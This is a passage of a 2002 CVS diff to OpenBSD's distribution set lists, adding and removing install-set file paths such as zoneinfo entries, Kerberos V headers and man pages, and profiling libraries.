-./usr/share/zoneinfo/posix/Etc/GMT+11
-./usr/share/zoneinfo/posix/Etc/GMT+12
-./usr/share/zoneinfo/posix/Etc/GMT+2
-./usr/share/zoneinfo/posix/Etc/GMT+3
-./usr/share/zoneinfo/posix/Etc/GMT+4
-./usr/share/zoneinfo/posix/Etc/GMT+5
-./usr/share/zoneinfo/posix/Etc/GMT+6
-./usr/share/zoneinfo/posix/Etc/GMT+7
-./usr/share/zoneinfo/posix/Etc/GMT+8
-./usr/share/zoneinfo/posix/Etc/GMT+9
-./usr/share/zoneinfo/posix/Etc/GMT-0
-./usr/share/zoneinfo/posix/Etc/GMT-1
-./usr/share/zoneinfo/posix/Etc/GMT-10
-./usr/share/zoneinfo/posix/Etc/GMT-11
-./usr/share/zoneinfo/posix/Etc/GMT-12
-./usr/share/zoneinfo/posix/Etc/GMT-13
-./usr/share/zoneinfo/posix/Etc/GMT-14
-./usr/share/zoneinfo/posix/Etc/GMT-2
-./usr/share/zoneinfo/posix/Etc/GMT-3
-./usr/share/zoneinfo/posix/Etc/GMT-4
-./usr/share/zoneinfo/posix/Etc/GMT-5
-./usr/share/zoneinfo/posix/Etc/GMT-6
-./usr/share/zoneinfo/posix/Etc/GMT-7
-./usr/share/zoneinfo/posix/Etc/GMT-8
-./usr/share/zoneinfo/posix/Etc/GMT-9
-./usr/share/zoneinfo/posix/Etc/GMT0
-./usr/share/zoneinfo/posix/Etc/Greenwich
-./usr/share/zoneinfo/posix/Etc/UCT
-./usr/share/zoneinfo/posix/Etc/UTC
-./usr/share/zoneinfo/posix/Etc/Universal
-./usr/share/zoneinfo/posix/Etc/Zulu
-./usr/share/zoneinfo/posix/Europe
-./usr/share/zoneinfo/posix/Europe/Amsterdam
-./usr/share/zoneinfo/posix/Europe/Andorra
-./usr/share/zoneinfo/posix/Europe/Athens
-./usr/share/zoneinfo/posix/Europe/Belfast
-./usr/share/zoneinfo/posix/Europe/Belgrade
-./usr/share/zoneinfo/posix/Europe/Berlin
-./usr/share/zoneinfo/posix/Europe/Bratislava
-./usr/share/zoneinfo/posix/Europe/Brussels
-./usr/share/zoneinfo/posix/Europe/Bucharest
-./usr/share/zoneinfo/posix/Europe/Budapest
-./usr/share/zoneinfo/posix/Europe/Chisinau
-./usr/share/zoneinfo/posix/Europe/Copenhagen
-./usr/share/zoneinfo/posix/Europe/Dublin
-./usr/share/zoneinfo/posix/Europe/Gibraltar
-./usr/share/zoneinfo/posix/Europe/Helsinki
-./usr/share/zoneinfo/posix/Europe/Istanbul
-./usr/share/zoneinfo/posix/Europe/Kaliningrad
-./usr/share/zoneinfo/posix/Europe/Kiev
-./usr/share/zoneinfo/posix/Europe/Lisbon
-./usr/share/zoneinfo/posix/Europe/Ljubljana
-./usr/share/zoneinfo/posix/Europe/London
-./usr/share/zoneinfo/posix/Europe/Luxembourg
-./usr/share/zoneinfo/posix/Europe/Madrid
-./usr/share/zoneinfo/posix/Europe/Malta
-./usr/share/zoneinfo/posix/Europe/Minsk
-./usr/share/zoneinfo/posix/Europe/Monaco
-./usr/share/zoneinfo/posix/Europe/Moscow
-./usr/share/zoneinfo/posix/Europe/Nicosia
-./usr/share/zoneinfo/posix/Europe/Oslo
-./usr/share/zoneinfo/posix/Europe/Paris
-./usr/share/zoneinfo/posix/Europe/Prague
-./usr/share/zoneinfo/posix/Europe/Riga
-./usr/share/zoneinfo/posix/Europe/Rome
-./usr/share/zoneinfo/posix/Europe/Samara
-./usr/share/zoneinfo/posix/Europe/San_Marino
-./usr/share/zoneinfo/posix/Europe/Sarajevo
-./usr/share/zoneinfo/posix/Europe/Simferopol
-./usr/share/zoneinfo/posix/Europe/Skopje
-./usr/share/zoneinfo/posix/Europe/Sofia
-./usr/share/zoneinfo/posix/Europe/Stockholm
-./usr/share/zoneinfo/posix/Europe/Tallinn
-./usr/share/zoneinfo/posix/Europe/Tirane
-./usr/share/zoneinfo/posix/Europe/Tiraspol
-./usr/share/zoneinfo/posix/Europe/Uzhgorod
-./usr/share/zoneinfo/posix/Europe/Vaduz
-./usr/share/zoneinfo/posix/Europe/Vatican
-./usr/share/zoneinfo/posix/Europe/Vienna
-./usr/share/zoneinfo/posix/Europe/Vilnius
-./usr/share/zoneinfo/posix/Europe/Warsaw
-./usr/share/zoneinfo/posix/Europe/Zagreb
-./usr/share/zoneinfo/posix/Europe/Zaporozhye
-./usr/share/zoneinfo/posix/Europe/Zurich
-./usr/share/zoneinfo/posix/Factory
-./usr/share/zoneinfo/posix/GB
-./usr/share/zoneinfo/posix/GB-Eire
-./usr/share/zoneinfo/posix/GMT
-./usr/share/zoneinfo/posix/GMT+0
-./usr/share/zoneinfo/posix/GMT-0
-./usr/share/zoneinfo/posix/GMT0
-./usr/share/zoneinfo/posix/Greenwich
-./usr/share/zoneinfo/posix/HST
-./usr/share/zoneinfo/posix/Hongkong
-./usr/share/zoneinfo/posix/Iceland
-./usr/share/zoneinfo/posix/Indian
-./usr/share/zoneinfo/posix/Indian/Antananarivo
-./usr/share/zoneinfo/posix/Indian/Chagos
-./usr/share/zoneinfo/posix/Indian/Christmas
-./usr/share/zoneinfo/posix/Indian/Cocos
-./usr/share/zoneinfo/posix/Indian/Comoro
-./usr/share/zoneinfo/posix/Indian/Kerguelen
-./usr/share/zoneinfo/posix/Indian/Mahe
-./usr/share/zoneinfo/posix/Indian/Maldives
-./usr/share/zoneinfo/posix/Indian/Mauritius
-./usr/share/zoneinfo/posix/Indian/Mayotte
-./usr/share/zoneinfo/posix/Indian/Reunion
-./usr/share/zoneinfo/posix/Iran
-./usr/share/zoneinfo/posix/Israel
-./usr/share/zoneinfo/posix/Jamaica
-./usr/share/zoneinfo/posix/Japan
-./usr/share/zoneinfo/posix/Kwajalein
-./usr/share/zoneinfo/posix/Libya
-./usr/share/zoneinfo/posix/MET
-./usr/share/zoneinfo/posix/MST
-./usr/share/zoneinfo/posix/MST7MDT
-./usr/share/zoneinfo/posix/Mexico
-./usr/share/zoneinfo/posix/Mexico/BajaNorte
-./usr/share/zoneinfo/posix/Mexico/BajaSur
-./usr/share/zoneinfo/posix/Mexico/General
-./usr/share/zoneinfo/posix/Mideast
-./usr/share/zoneinfo/posix/Mideast/Riyadh87
-./usr/share/zoneinfo/posix/Mideast/Riyadh88
-./usr/share/zoneinfo/posix/Mideast/Riyadh89
-./usr/share/zoneinfo/posix/NZ
-./usr/share/zoneinfo/posix/NZ-CHAT
-./usr/share/zoneinfo/posix/Navajo
-./usr/share/zoneinfo/posix/PRC
-./usr/share/zoneinfo/posix/PST8PDT
-./usr/share/zoneinfo/posix/Pacific
-./usr/share/zoneinfo/posix/Pacific/Apia
-./usr/share/zoneinfo/posix/Pacific/Auckland
-./usr/share/zoneinfo/posix/Pacific/Chatham
-./usr/share/zoneinfo/posix/Pacific/Easter
-./usr/share/zoneinfo/posix/Pacific/Efate
-./usr/share/zoneinfo/posix/Pacific/Enderbury
-./usr/share/zoneinfo/posix/Pacific/Fakaofo
-./usr/share/zoneinfo/posix/Pacific/Fiji
-./usr/share/zoneinfo/posix/Pacific/Funafuti
-./usr/share/zoneinfo/posix/Pacific/Galapagos
-./usr/share/zoneinfo/posix/Pacific/Gambier
-./usr/share/zoneinfo/posix/Pacific/Guadalcanal
-./usr/share/zoneinfo/posix/Pacific/Guam
-./usr/share/zoneinfo/posix/Pacific/Honolulu
-./usr/share/zoneinfo/posix/Pacific/Johnston
-./usr/share/zoneinfo/posix/Pacific/Kiritimati
-./usr/share/zoneinfo/posix/Pacific/Kosrae
-./usr/share/zoneinfo/posix/Pacific/Kwajalein
-./usr/share/zoneinfo/posix/Pacific/Majuro
-./usr/share/zoneinfo/posix/Pacific/Marquesas
-./usr/share/zoneinfo/posix/Pacific/Midway
-./usr/share/zoneinfo/posix/Pacific/Nauru
-./usr/share/zoneinfo/posix/Pacific/Niue
-./usr/share/zoneinfo/posix/Pacific/Norfolk
-./usr/share/zoneinfo/posix/Pacific/Noumea
-./usr/share/zoneinfo/posix/Pacific/Pago_Pago
-./usr/share/zoneinfo/posix/Pacific/Palau
-./usr/share/zoneinfo/posix/Pacific/Pitcairn
-./usr/share/zoneinfo/posix/Pacific/Ponape
-./usr/share/zoneinfo/posix/Pacific/Port_Moresby
-./usr/share/zoneinfo/posix/Pacific/Rarotonga
-./usr/share/zoneinfo/posix/Pacific/Saipan
-./usr/share/zoneinfo/posix/Pacific/Samoa
-./usr/share/zoneinfo/posix/Pacific/Tahiti
-./usr/share/zoneinfo/posix/Pacific/Tarawa
-./usr/share/zoneinfo/posix/Pacific/Tongatapu
-./usr/share/zoneinfo/posix/Pacific/Truk
-./usr/share/zoneinfo/posix/Pacific/Wake
-./usr/share/zoneinfo/posix/Pacific/Wallis
-./usr/share/zoneinfo/posix/Pacific/Yap
-./usr/share/zoneinfo/posix/Poland
-./usr/share/zoneinfo/posix/Portugal
-./usr/share/zoneinfo/posix/ROC
-./usr/share/zoneinfo/posix/ROK
-./usr/share/zoneinfo/posix/Singapore
-./usr/share/zoneinfo/posix/SystemV
-./usr/share/zoneinfo/posix/SystemV/AST4
-./usr/share/zoneinfo/posix/SystemV/AST4ADT
-./usr/share/zoneinfo/posix/SystemV/CST6
-./usr/share/zoneinfo/posix/SystemV/CST6CDT
-./usr/share/zoneinfo/posix/SystemV/EST5
-./usr/share/zoneinfo/posix/SystemV/EST5EDT
-./usr/share/zoneinfo/posix/SystemV/HST10
-./usr/share/zoneinfo/posix/SystemV/MST7
-./usr/share/zoneinfo/posix/SystemV/MST7MDT
-./usr/share/zoneinfo/posix/SystemV/PST8
-./usr/share/zoneinfo/posix/SystemV/PST8PDT
-./usr/share/zoneinfo/posix/SystemV/YST9
-./usr/share/zoneinfo/posix/SystemV/YST9YDT
-./usr/share/zoneinfo/posix/Turkey
-./usr/share/zoneinfo/posix/UCT
-./usr/share/zoneinfo/posix/US
-./usr/share/zoneinfo/posix/US/Alaska
-./usr/share/zoneinfo/posix/US/Aleutian
-./usr/share/zoneinfo/posix/US/Arizona
-./usr/share/zoneinfo/posix/US/Central
-./usr/share/zoneinfo/posix/US/East-Indiana
-./usr/share/zoneinfo/posix/US/Eastern
-./usr/share/zoneinfo/posix/US/Hawaii
-./usr/share/zoneinfo/posix/US/Indiana-Starke
-./usr/share/zoneinfo/posix/US/Michigan
-./usr/share/zoneinfo/posix/US/Mountain
-./usr/share/zoneinfo/posix/US/Pacific
-./usr/share/zoneinfo/posix/US/Pacific-New
-./usr/share/zoneinfo/posix/US/Samoa
-./usr/share/zoneinfo/posix/UTC
-./usr/share/zoneinfo/posix/Universal
-./usr/share/zoneinfo/posix/W-SU
-./usr/share/zoneinfo/posix/WET
-./usr/share/zoneinfo/posix/Zulu
 ./usr/share/zoneinfo/posixrules
 ./usr/share/zoneinfo/right
 ./usr/share/zoneinfo/right/Africa
@@ -4044,14 +2849,8 @@
 ./var/games/phantasia
 ./var/games/save
 ./var/log
-./var/log/rdist
 ./var/mail
 ./var/msgs
-./var/named
-./var/named/dev
-./var/named/etc
-./var/named/named-xfer
-./var/named/namedb
 ./var/preserve
 ./var/quotas
 ./var/run
@@ -4088,9 +2887,3 @@
 ./var/www/icons/small
 ./var/www/logs
 ./var/www/users
-./var/yp
-./var/yp/Makefile.main
-./var/yp/Makefile.main.dist
-./var/yp/Makefile.yp
-./var/yp/Makefile.yp.dist
-./var/yp/README
Index: src/distrib/sets/lists/comp/md.i386
===================================================================
RCS file: /cvs/src/distrib/sets/lists/comp/md.i386,v
retrieving revision 1.87
diff -u -r1.87 md.i386
--- src/distrib/sets/lists/comp/md.i386	18 Nov 2002 01:26:02 -0000	1.87
+++ src/distrib/sets/lists/comp/md.i386	20 Dec 2002 23:24:41 -0000
@@ -63,9 +63,7 @@
 ./usr/include/link.h
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/SYSCALLS.c.X
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/cc1
-./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/cc1obj
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/cc1plus
-./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/f771
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/fpic
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/fpic/libgcc.a
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/include/README
@@ -77,59 +75,11 @@
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/include/syslimits.h
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/include/typeinfo
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/libgcc.a
-./usr/lib/lib45_pic.a
-./usr/lib/libacl_pic.a
-./usr/lib/libasn1_pic.a
 ./usr/lib/libbfd.a
-./usr/lib/libc_pic.a
-./usr/lib/libc_r_pic.a
-./usr/lib/libcom_err_pic.a
-./usr/lib/libcrypto_pic.a
-./usr/lib/libcurses++_pic.a
-./usr/lib/libcurses_pic.a
-./usr/lib/libdes_pic.a
-./usr/lib/libedit_pic.a
-./usr/lib/libform_pic.a
-./usr/lib/libfrtbegin_pic.a
-./usr/lib/libg2c_pic.a
-./usr/lib/libgssapi_pic.a
 ./usr/lib/libi386.a
-./usr/lib/libi386_p.a
-./usr/lib/libiberty_pic.a
-./usr/lib/libkadm5clnt_pic.a
-./usr/lib/libkadm5srv_pic.a
-./usr/lib/libkadm_pic.a
-./usr/lib/libkafs_pic.a
-./usr/lib/libkdb_pic.a
-./usr/lib/libkrb5_pic.a
-./usr/lib/libkrb_pic.a
-./usr/lib/libkvm_pic.a
-./usr/lib/libm_pic.a
-./usr/lib/libmenu_pic.a
 ./usr/lib/libmmalloc.a
-./usr/lib/libncurses_pic.a
-./usr/lib/libnpthread_pic.a
-./usr/lib/libobjc_pic.a
-./usr/lib/libocurses_pic.a
 ./usr/lib/libopcodes.a
-./usr/lib/libossaudio_pic.a
-./usr/lib/libotermcap_pic.a
-./usr/lib/libpanel_pic.a
-./usr/lib/libpcap_pic.a
-./usr/lib/libperl_pic.a
 ./usr/lib/libreadline.a
-./usr/lib/libreadline_pic.a
-./usr/lib/libsectok_pic.a
-./usr/lib/libskey_pic.a
-./usr/lib/libssl_pic.a
-./usr/lib/libstdc++_pic.a
-./usr/lib/libtelnet_pic.a
-./usr/lib/libtermcap_pic.a
-./usr/lib/libtermlib_pic.a
-./usr/lib/libusbhid_pic.a
-./usr/lib/libutil_pic.a
-./usr/lib/libwrap_pic.a
-./usr/lib/libz_pic.a
 ./usr/lib/scrt0.o
 ./usr/libdata/perl5/site_perl/i386-openbsd/dev/usb/umct.ph
 ./usr/libdata/perl5/site_perl/i386-openbsd/dev/usb/umidi_quirks.ph
Index: src/distrib/sets/lists/comp/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/comp/mi,v
retrieving revision 1.356
diff -u -r1.356 mi
--- src/distrib/sets/lists/comp/mi	18 Dec 2002 06:50:16 -0000	1.356
+++ src/distrib/sets/lists/comp/mi	20 Dec 2002 23:24:41 -0000
@@ -5,12 +5,12 @@
 ./usr/bin/c++
 ./usr/bin/c++filt
 ./usr/bin/cc
-./usr/bin/f77
+./usr/bin/crunchgen
+./usr/bin/crunchide
 ./usr/bin/flex
 ./usr/bin/flex++
 ./usr/bin/fpr
 ./usr/bin/g++
-./usr/bin/g77
 ./usr/bin/gcc
 ./usr/bin/gcov
 ./usr/bin/gprof
@@ -890,32 +890,6 @@
 ./usr/include/kerberosIV/krb_db.h
 ./usr/include/kerberosIV/krb_err.h
 ./usr/include/kerberosIV/prot.h
-./usr/include/kerberosV
-./usr/include/kerberosV/admin.h
-./usr/include/kerberosV/asn1-common.h
-./usr/include/kerberosV/asn1_err.h
-./usr/include/kerberosV/der.h
-./usr/include/kerberosV/gssapi.h
-./usr/include/kerberosV/hdb-private.h
-./usr/include/kerberosV/hdb-protos.h
-./usr/include/kerberosV/hdb.h
-./usr/include/kerberosV/hdb_asn1.h
-./usr/include/kerberosV/hdb_err.h
-./usr/include/kerberosV/heim_err.h
-./usr/include/kerberosV/k524_err.h
-./usr/include/kerberosV/kadm5
-./usr/include/kerberosV/kadm5/admin.h
-./usr/include/kerberosV/kadm5/kadm5_err.h
-./usr/include/kerberosV/kadm5/private.h
-./usr/include/kerberosV/kadm5_err.h
-./usr/include/kerberosV/kafs.h
-./usr/include/kerberosV/krb5-private.h
-./usr/include/kerberosV/krb5-protos.h
-./usr/include/kerberosV/krb5-types.h
-./usr/include/kerberosV/krb5.h
-./usr/include/kerberosV/krb5_asn1.h
-./usr/include/kerberosV/krb5_err.h
-./usr/include/kerberosV/private.h
 ./usr/include/keynote.h
 ./usr/include/kvm.h
 ./usr/include/langinfo.h
@@ -1612,118 +1586,52 @@
 ./usr/lib/crt0.o
 ./usr/lib/debug
 ./usr/lib/gcrt0.o
-./usr/lib/lib45.a
-./usr/lib/lib45_p.a
 ./usr/lib/libacl.a
-./usr/lib/libacl_p.a
-./usr/lib/libasn1.a
-./usr/lib/libasn1_p.a
 ./usr/lib/libbfd.la
 ./usr/lib/libc.a
-./usr/lib/libc_p.a
 ./usr/lib/libc_r.a
-./usr/lib/libc_r_p.a
 ./usr/lib/libcom_err.a
-./usr/lib/libcom_err_p.a
 ./usr/lib/libcompat.a
-./usr/lib/libcompat_p.a
 ./usr/lib/libcrypto.a
-./usr/lib/libcrypto_p.a
 ./usr/lib/libcurses++.a
-./usr/lib/libcurses++_p.a
 ./usr/lib/libcurses.a
-./usr/lib/libcurses_p.a
 ./usr/lib/libdes.a
-./usr/lib/libdes_p.a
 ./usr/lib/libedit.a
-./usr/lib/libedit_p.a
 ./usr/lib/libevent.a
-./usr/lib/libevent_p.a
 ./usr/lib/libfl.a
-./usr/lib/libfl_p.a
 ./usr/lib/libform.a
-./usr/lib/libform_p.a
-./usr/lib/libfrtbegin.a
-./usr/lib/libfrtbegin_p.a
-./usr/lib/libg2c.a
-./usr/lib/libg2c_p.a
-./usr/lib/libgssapi.a
-./usr/lib/libgssapi_p.a
-./usr/lib/libhdb.a
 ./usr/lib/libiberty.a
-./usr/lib/libiberty_p.a
 ./usr/lib/libkadm.a
-./usr/lib/libkadm5clnt.a
-./usr/lib/libkadm5clnt_p.a
-./usr/lib/libkadm5srv.a
-./usr/lib/libkadm5srv_p.a
-./usr/lib/libkadm_p.a
-./usr/lib/libkafs.a
-./usr/lib/libkafs_p.a
 ./usr/lib/libkdb.a
-./usr/lib/libkdb_p.a
 ./usr/lib/libkeynote.a
-./usr/lib/libkeynote_p.a
 ./usr/lib/libkrb.a
-./usr/lib/libkrb5.a
-./usr/lib/libkrb5_p.a
-./usr/lib/libkrb_p.a
 ./usr/lib/libkvm.a
-./usr/lib/libkvm_p.a
 ./usr/lib/libl.a
-./usr/lib/libl_p.a
 ./usr/lib/libm.a
-./usr/lib/libm_p.a
 ./usr/lib/libmenu.a
-./usr/lib/libmenu_p.a
 ./usr/lib/libncurses.a
-./usr/lib/libncurses_p.a
 ./usr/lib/libnpthread.a
-./usr/lib/libnpthread_p.a
-./usr/lib/libobjc.a
-./usr/lib/libobjc_p.a
 ./usr/lib/libocurses.a
-./usr/lib/libocurses_p.a
 ./usr/lib/libopcodes.la
 ./usr/lib/libossaudio.a
-./usr/lib/libossaudio_p.a
 ./usr/lib/libotermcap.a
-./usr/lib/libotermcap_p.a
 ./usr/lib/libpanel.a
-./usr/lib/libpanel_p.a
 ./usr/lib/libpcap.a
-./usr/lib/libpcap_p.a
 ./usr/lib/libperl.a
-./usr/lib/libperl_p.a
-./usr/lib/libreadline_p.a
 ./usr/lib/libresolv.a
-./usr/lib/libresolv_p.a
 ./usr/lib/librpcsvc.a
-./usr/lib/librpcsvc_p.a
 ./usr/lib/libsectok.a
-./usr/lib/libsectok_p.a
 ./usr/lib/libskey.a
-./usr/lib/libskey_p.a
 ./usr/lib/libssl.a
-./usr/lib/libssl_p.a
 ./usr/lib/libstdc++.a
-./usr/lib/libstdc++_p.a
 ./usr/lib/libtelnet.a
-./usr/lib/libtelnet_p.a
 ./usr/lib/libtermcap.a
-./usr/lib/libtermcap_p.a
 ./usr/lib/libtermlib.a
-./usr/lib/libtermlib_p.a
 ./usr/lib/libusbhid.a
-./usr/lib/libusbhid_p.a
 ./usr/lib/libutil.a
-./usr/lib/libutil_p.a
 ./usr/lib/libwrap.a
-./usr/lib/libwrap_p.a
 ./usr/lib/liby.a
-./usr/lib/liby_p.a
 ./usr/lib/libz.a
-./usr/lib/libz_p.a
 ./usr/libdata/lint/llib-lposix.ln
 ./usr/libdata/lint/llib-lstdc.ln
 ./usr/libexec/lint1
@@ -1756,7 +1664,6 @@
 ./usr/share/man/cat1/c++.0
 ./usr/share/man/cat1/cc.0
 ./usr/share/man/cat1/cccp.0
-./usr/share/man/cat1/f77.0
 ./usr/share/man/cat1/flex.0
 ./usr/share/man/cat1/fpr.0
 ./usr/share/man/cat1/g++.0
@@ -3516,12 +3423,6 @@
 ./usr/share/man/cat3/jn.0
 ./usr/share/man/cat3/jnf.0
 ./usr/share/man/cat3/jrand48.0
-./usr/share/man/cat3/k_afs_cell_of_file.0
-./usr/share/man/cat3/k_hasafs.0
-./usr/share/man/cat3/k_pioctl.0
-./usr/share/man/cat3/k_setpag.0
-./usr/share/man/cat3/k_unlog.0
-./usr/share/man/cat3/kafs.0
 ./usr/share/man/cat3/kerberos.0
 ./usr/share/man/cat3/keybound.0
 ./usr/share/man/cat3/keycrunch.0
@@ -3557,114 +3458,6 @@
 ./usr/share/man/cat3/kn_remove_authorizer.0
 ./usr/share/man/cat3/kn_sign_assertion.0
 ./usr/share/man/cat3/kn_verify_assertion.0
-./usr/share/man/cat3/krb5_425_conv_principal.0
-./usr/share/man/cat3/krb5_425_conv_principal_ext.0
-./usr/share/man/cat3/krb5_524_conv_principal.0
-./usr/share/man/cat3/krb5_addlog_dest.0
-./usr/share/man/cat3/krb5_addlog_func.0
-./usr/share/man/cat3/krb5_appdefault.0
-./usr/share/man/cat3/krb5_appdefault_boolean.0
-./usr/share/man/cat3/krb5_appdefault_string.0
-./usr/share/man/cat3/krb5_appdefault_time.0
-./usr/share/man/cat3/krb5_auth_con_free.0
-./usr/share/man/cat3/krb5_auth_con_genaddrs.0
-./usr/share/man/cat3/krb5_auth_con_getaddrs.0
-./usr/share/man/cat3/krb5_auth_con_getflags.0
-./usr/share/man/cat3/krb5_auth_con_getkey.0
-./usr/share/man/cat3/krb5_auth_con_getlocalsubkey.0
-./usr/share/man/cat3/krb5_auth_con_getrcache.0
-./usr/share/man/cat3/krb5_auth_con_getremotesubkey.0
-./usr/share/man/cat3/krb5_auth_con_getuserkey.0
-./usr/share/man/cat3/krb5_auth_con_init.0
-./usr/share/man/cat3/krb5_auth_con_initivector.0
-./usr/share/man/cat3/krb5_auth_con_setaddrs.0
-./usr/share/man/cat3/krb5_auth_con_setaddrs_from_fd.0
-./usr/share/man/cat3/krb5_auth_con_setflags.0
-./usr/share/man/cat3/krb5_auth_con_setivector.0
-./usr/share/man/cat3/krb5_auth_con_setkey.0
-./usr/share/man/cat3/krb5_auth_con_setlocalsubkey.0
-./usr/share/man/cat3/krb5_auth_con_setrcache.0
-./usr/share/man/cat3/krb5_auth_con_setremotesubkey.0
-./usr/share/man/cat3/krb5_auth_con_setuserkey.0
-./usr/share/man/cat3/krb5_auth_context.0
-./usr/share/man/cat3/krb5_auth_getauthenticator.0
-./usr/share/man/cat3/krb5_auth_getcksumtype.0
-./usr/share/man/cat3/krb5_auth_getkeytype.0
-./usr/share/man/cat3/krb5_auth_getlocalseqnumber.0
-./usr/share/man/cat3/krb5_auth_getremoteseqnumber.0
-./usr/share/man/cat3/krb5_auth_setcksumtype.0
-./usr/share/man/cat3/krb5_auth_setkeytype.0
-./usr/share/man/cat3/krb5_auth_setlocalseqnumber.0
-./usr/share/man/cat3/krb5_auth_setremoteseqnumber.0
-./usr/share/man/cat3/krb5_build_principal.0
-./usr/share/man/cat3/krb5_build_principal_ext.0
-./usr/share/man/cat3/krb5_build_principal_va.0
-./usr/share/man/cat3/krb5_build_principal_va_ext.0
-./usr/share/man/cat3/krb5_checksum_is_collision_proof.0
-./usr/share/man/cat3/krb5_checksum_is_keyed.0
-./usr/share/man/cat3/krb5_checksumsize.0
-./usr/share/man/cat3/krb5_closelog.0
-./usr/share/man/cat3/krb5_config.0
-./usr/share/man/cat3/krb5_config_get_bool_default.0
-./usr/share/man/cat3/krb5_config_get_int_default.0
-./usr/share/man/cat3/krb5_config_get_string_default.0
-./usr/share/man/cat3/krb5_config_get_time_default.0
-./usr/share/man/cat3/krb5_context.0
-./usr/share/man/cat3/krb5_create_checksum.0
-./usr/share/man/cat3/krb5_crypto_destroy.0
-./usr/share/man/cat3/krb5_crypto_init.0
-./usr/share/man/cat3/krb5_decrypt.0
-./usr/share/man/cat3/krb5_decrypt_EncryptedData.0
-./usr/share/man/cat3/krb5_encrypt.0
-./usr/share/man/cat3/krb5_encrypt_EncryptedData.0
-./usr/share/man/cat3/krb5_err.0
-./usr/share/man/cat3/krb5_errx.0
-./usr/share/man/cat3/krb5_free_context.0
-./usr/share/man/cat3/krb5_free_principal.0
-./usr/share/man/cat3/krb5_init_context.0
-./usr/share/man/cat3/krb5_initlog.0
-./usr/share/man/cat3/krb5_keytab.0
-./usr/share/man/cat3/krb5_keytab_entry.0
-./usr/share/man/cat3/krb5_kt_add_entry.0
-./usr/share/man/cat3/krb5_kt_close.0
-./usr/share/man/cat3/krb5_kt_compare.0
-./usr/share/man/cat3/krb5_kt_copy_entry_contents.0
-./usr/share/man/cat3/krb5_kt_cursor.0
-./usr/share/man/cat3/krb5_kt_default.0
-./usr/share/man/cat3/krb5_kt_default_name.0
-./usr/share/man/cat3/krb5_kt_end_seq_get.0
-./usr/share/man/cat3/krb5_kt_free_entry.0
-./usr/share/man/cat3/krb5_kt_get_entry.0
-./usr/share/man/cat3/krb5_kt_get_name.0
-./usr/share/man/cat3/krb5_kt_next_entry.0
-./usr/share/man/cat3/krb5_kt_ops.0
-./usr/share/man/cat3/krb5_kt_read_service_key.0
-./usr/share/man/cat3/krb5_kt_register.0
-./usr/share/man/cat3/krb5_kt_remove_entry.0
-./usr/share/man/cat3/krb5_kt_resolve.0
-./usr/share/man/cat3/krb5_kt_start_seq_get.0
-./usr/share/man/cat3/krb5_log.0
-./usr/share/man/cat3/krb5_log_msg.0
-./usr/share/man/cat3/krb5_make_principal.0
-./usr/share/man/cat3/krb5_openlog.0
-./usr/share/man/cat3/krb5_parse_name.0
-./usr/share/man/cat3/krb5_set_warn_dest.0
-./usr/share/man/cat3/krb5_sname_to_principal.0
-./usr/share/man/cat3/krb5_sock_to_principal.0
-./usr/share/man/cat3/krb5_unparse_name.0
-./usr/share/man/cat3/krb5_verify_checksum.0
-./usr/share/man/cat3/krb5_verify_user.0
-./usr/share/man/cat3/krb5_verify_user_lrealm.0
-./usr/share/man/cat3/krb5_verr.0
-./usr/share/man/cat3/krb5_verrx.0
-./usr/share/man/cat3/krb5_vlog.0
-./usr/share/man/cat3/krb5_vlog_msg.0
-./usr/share/man/cat3/krb5_vwarn.0
-./usr/share/man/cat3/krb5_vwarnx.0
-./usr/share/man/cat3/krb5_warn.0
-./usr/share/man/cat3/krb5_warnx.0
-./usr/share/man/cat3/krb_afslog.0
-./usr/share/man/cat3/krb_afslog_uid.0
 ./usr/share/man/cat3/krb_ck_repl.0
 ./usr/share/man/cat3/krb_get_admhst.0
 ./usr/share/man/cat3/krb_get_cred.0
@@ -4710,18 +4503,6 @@
 ./usr/share/man/cat3/y1f.0
 ./usr/share/man/cat3/yn.0
 ./usr/share/man/cat3/ynf.0
-./usr/share/man/cat3/yp_all.0
-./usr/share/man/cat3/yp_bind.0
-./usr/share/man/cat3/yp_first.0
-./usr/share/man/cat3/yp_get_default_domain.0
-./usr/share/man/cat3/yp_master.0
-./usr/share/man/cat3/yp_match.0
-./usr/share/man/cat3/yp_next.0
-./usr/share/man/cat3/yp_order.0
-./usr/share/man/cat3/yp_unbind.0
-./usr/share/man/cat3/ypclnt.0
-./usr/share/man/cat3/yperr_string.0
-./usr/share/man/cat3/ypprot_err.0
 ./usr/share/man/cat9/FREE.0
 ./usr/share/man/cat9/FREF.0
 ./usr/share/man/cat9/FRELE.0
Index: src/distrib/sets/lists/etc/mi
===================================================================
RCS file: /cvs/src/distrib/sets/lists/etc/mi,v
retrieving revision 1.67
diff -u -r1.67 mi
--- src/distrib/sets/lists/etc/mi	16 Dec 2002 00:14:30 -0000	1.67
+++ src/distrib/sets/lists/etc/mi	20 Dec 2002 23:24:41 -0000
@@ -1,10 +1,3 @@
-./.cshrc
-./.profile
-./etc/afs/CellServDB
-./etc/afs/README
-./etc/afs/SuidCells
-./etc/afs/ThisCell
-./etc/afs/afsd.conf
 ./etc/amd/master.sample
 ./etc/authpf
 ./etc/bootptab
@@ -29,14 +22,6 @@
 ./etc/hosts.equiv
 ./etc/hosts.lpd
 ./etc/inetd.conf
-./etc/kerberosIV/README
-./etc/kerberosIV/krb.conf
-./etc/kerberosIV/krb.equiv
-./etc/kerberosIV/krb.extra
-./etc/kerberosIV/krb.realms
-./etc/kerberosV
-./etc/kerberosV/README
-./etc/kerberosV/krb5.conf.example
 ./etc/ksh.kshrc
 ./etc/localtime
 ./etc/locate.rc
@@ -53,6 +38,7 @@
 ./etc/mailer.conf
 ./etc/man.conf
 ./etc/master.passwd
+./etc/mk.conf
 ./etc/moduli
 ./etc/monthly
 ./etc/motd
@@ -80,6 +66,7 @@
 ./etc/ppp/ppp.linkup.sample
 ./etc/ppp/ppp.secret.sample
